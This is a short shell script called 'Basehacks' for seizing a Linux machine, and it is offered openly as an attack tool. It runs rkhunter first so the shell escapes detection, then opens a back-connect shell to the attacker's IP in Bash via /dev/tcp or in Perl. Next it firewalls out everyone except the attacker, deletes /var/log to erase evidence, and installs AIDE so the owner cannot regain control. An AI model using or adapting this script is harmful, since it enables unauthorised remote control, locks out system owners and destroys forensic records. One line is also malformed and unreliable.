########################
#                      #
#      Basehacks       #
#                      #
#          ▲           #
#         ▲ ▲          #
#                      #
#                      #
#                      #
#                      #
########################
 
#!/bin/sh

echo 'Commencing...'
 
# rkhunter, a rootkit, back-connect shell and general malware hunter. Run this
# before the back-connect shell so it doesn't detect it.

su -l -c "urpmi rkhunter && rkhunter --update"

su -l -c "rkhunter --check && urpmi.removemedia rkhunter"
 
# Bash back-connect shell, delete it if you're using the Perl one.
 
bash -i >& /dev/tcp/yourip/portofchoice 0>&1
 
# Optional Perl shell, delete this if you're using the Bash one.
 
perl -e 'use Socket;$i="yourip";$p=portofchoice;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 
# Installs iptables and configures it to only allow connections from your IP on port 22,
# if you already have iptables installed remove the first command, edit the IP in the IP table command to your own 
# and edit the port to the ssh port.
 
su -l -c "urpmi iptables && iptables -A INPUT -p tcp -s 127.0.0.1 --d-port 22 -j ACCEPT"
 
# The below line will DROP all incoming connections.
 
su -l -c "iptables -P INPUT DROP"
 
su -l -c "rm -rf /var/log && rm -rf /var/logs"

# Installs the AIDE intrusion detection system in case the owner gets back in.

su -l -c "urpmi AIDE && aideinit"

su - l - c "cp /var/lib/aide/aide.db.new /var/lib/aide/aide.db"
 
echo 'Complete!'
